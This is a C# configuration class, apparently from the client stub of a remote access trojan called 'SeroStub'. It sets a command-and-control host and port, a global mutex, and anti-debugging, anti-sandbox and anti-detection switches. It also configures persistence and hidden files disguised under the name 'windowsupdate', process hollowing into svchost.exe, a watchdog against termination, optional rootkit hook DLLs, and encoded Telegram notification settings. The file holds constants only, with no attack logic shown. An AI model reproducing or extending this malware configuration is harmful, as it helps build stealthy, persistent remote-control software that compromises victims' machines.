namespace SeroStub;

internal static class Config
{
    public static readonly string[] Hosts = new[] { "localhost" };
    public const int Port = 2727;
    public const bool UseMutex = true;
    public const string MutexName = "Global\\3275d66f6653492e9bb84d2de970e13f";

    public const bool AntiDebug = true;
    public const bool AntiVM = false;
    public const bool AntiDetect = true;
    public const bool AntiSandbox = true;
    public const bool BlockCis = true;

    public const bool PersistRegistry = false;
    public const bool PersistStartup = false;
    public const bool PersistTask = false;
    public const string PersistName = "windowsupdate";

    public const bool AntiKill = true;
    public const bool EnableWatchdog = true;
    public const bool EnableHollowing = true;
    public const string HollowTarget = "svchost.exe";

    public const string AuthKey = "XbrUQWE1lZfTR4+Ho8LI73lW/1gjQiEq";
    public const string CertHash = "700A8415A26C242E4A77FC13CE862990AD2E754A988DB535291B7CCD1ACBB14C";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = "36695ebeb3674c4ebc50a9c6ab6de42f";

    public const int ReconnectDelayMs = 5000;
    public const int HeartbeatIntervalMs = 3000;

    public const string ClientIdPrefix = "Spas";

    // HiddenProcessName = install filename without extension = DLL prefix
    // The hook DLL reads its own filename as the prefix and hides everything starting with it.
    public const string HiddenProcessName = "windowsupdate";
    public const string HiddenFileName = "windowsupdate.exe";

    public const bool EnableRootkit = false;
    public static readonly byte[] HookDllBytes   = Array.Empty<byte>();
    public static readonly byte[] HookDllBytes32 = Array.Empty<byte>();

    // Telegram notification (SFC64-encoded — never stored as plaintext in binary)
    public const bool TelegramEnabled = false;
    public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
    public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
    public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
    public static readonly byte[] TelegramSfcSeed    = new byte[] { 165, 114, 15, 205, 174, 31, 54, 103, 47, 12, 149, 243, 83, 193, 69, 193, 123, 112, 54, 102, 244, 162, 137, 43, 79, 50, 3, 48, 204, 211, 231, 42 };
}
